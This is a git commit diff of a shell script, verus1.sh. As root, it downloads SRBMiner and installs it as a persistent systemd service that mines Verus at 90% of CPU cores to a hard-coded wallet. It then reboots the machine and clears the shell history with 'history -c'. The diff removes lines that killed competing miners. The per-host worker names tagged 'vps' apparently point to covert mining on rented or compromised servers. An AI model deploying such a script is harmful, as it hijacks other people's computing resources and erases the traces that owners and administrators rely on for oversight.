e061b2112d45e49dbb6c9401d0c644824842b0f8
tonnyhoang2014 <91616570+tonnyhoang2014@users.noreply.github.com>
2022-12-12 21:42:37 +0700

    Update verus1.sh

--- verus1.sh
+++ verus1.sh
@@ -1,26 +1,22 @@
 cd /usr/local/bin
-sudo killall SRBMiner-MULTI
-sudo killall xmrig
-sudo rm -rf xmrig-6.18.1
-sudo rm -rf xmrig-6.16.2
 myworker=$(TZ='Asia/Ho_Chi_Minh' date +'%d-%m_%H')
 noCore=$(nproc --all)
 usingcore=$((noCore*90/100))
 if [[ $noCore -eq 16 ]]
 then
-  sudo wget https://github.com/doktor83/SRBMiner-Multi/releases/download/1.1.1/SRBMiner-Multi-1-1-1-Linux.tar.xz
-  sudo tar -xvf SRBMiner-Multi-1-1-1-Linux.tar.xz
-  sudo bash -c 'echo -e "[Unit]\nDescription=XMRig Miner\nAfter=network.target\n\n[Service]\nType=simple\nExecStart=/usr/local/bin/SRBMiner-Multi-1-1-1/SRBMiner-MULTI --disable-gpu --algorithm verushash --cpu-threads "'${usingcore}'" --pool eu.luckpool.net:3956 --wallet RBuLg5R4VagKzG5dM6DGG5VMiHi9YUva7s."'${myworker}_ml_${noCore}'" --password hybrid\n\n[Install]\nWantedBy=multi-user.target" > /etc/systemd/system/verus.service'
-  sudo systemctl daemon-reload
-  sudo systemctl enable verus.service
-  sudo reboot &
-  history -c
+	sudo wget https://github.com/doktor83/SRBMiner-Multi/releases/download/1.1.1/SRBMiner-Multi-1-1-1-Linux.tar.xz
+	sudo tar -xvf SRBMiner-Multi-1-1-1-Linux.tar.xz
+	sudo bash -c 'echo -e "[Unit]\nDescription=XMRig Miner\nAfter=network.target\n\n[Service]\nType=simple\nExecStart=/usr/local/bin/SRBMiner-Multi-1-1-1/SRBMiner-MULTI --disable-gpu --algorithm verushash --cpu-threads "'${usingcore}'" --pool eu.luckpool.net:3956 --wallet RBuLg5R4VagKzG5dM6DGG5VMiHi9YUva7s."'${myworker}_ml_${noCore}'" --password hybrid\n\n[Install]\nWantedBy=multi-user.target" > /etc/systemd/system/verus.service'
+	sudo systemctl daemon-reload
+	sudo systemctl enable verus.service
+	sudo reboot &
+	history -c
 else
 	sudo wget https://github.com/doktor83/SRBMiner-Multi/releases/download/1.1.1/SRBMiner-Multi-1-1-1-Linux.tar.xz
-  sudo tar -xvf SRBMiner-Multi-1-1-1-Linux.tar.xz
-  sudo bash -c 'echo -e "[Unit]\nDescription=XMRig Miner\nAfter=network.target\n\n[Service]\nType=simple\nExecStart=/usr/local/bin/SRBMiner-Multi-1-1-1/SRBMiner-MULTI --disable-gpu --algorithm verushash --cpu-threads "'${usingcore}'" --pool eu.luckpool.net:3956 --wallet RBuLg5R4VagKzG5dM6DGG5VMiHi9YUva7s."'${myworker}_vps_${noCore}'" --password hybrid\n\n[Install]\nWantedBy=multi-user.target" > /etc/systemd/system/verus.service'
-  sudo systemctl daemon-reload
-  sudo systemctl enable verus.service
-  sudo reboot &
-  history -c
+	sudo tar -xvf SRBMiner-Multi-1-1-1-Linux.tar.xz
+	sudo bash -c 'echo -e "[Unit]\nDescription=XMRig Miner\nAfter=network.target\n\n[Service]\nType=simple\nExecStart=/usr/local/bin/SRBMiner-Multi-1-1-1/SRBMiner-MULTI --disable-gpu --algorithm verushash --cpu-threads "'${usingcore}'" --pool eu.luckpool.net:3956 --wallet RBuLg5R4VagKzG5dM6DGG5VMiHi9YUva7s."'${myworker}_vps_${noCore}'" --password hybrid\n\n[Install]\nWantedBy=multi-user.target" > /etc/systemd/system/verus.service'
+	sudo systemctl daemon-reload
+	sudo systemctl enable verus.service
+	sudo reboot &
+	history -c
 fi
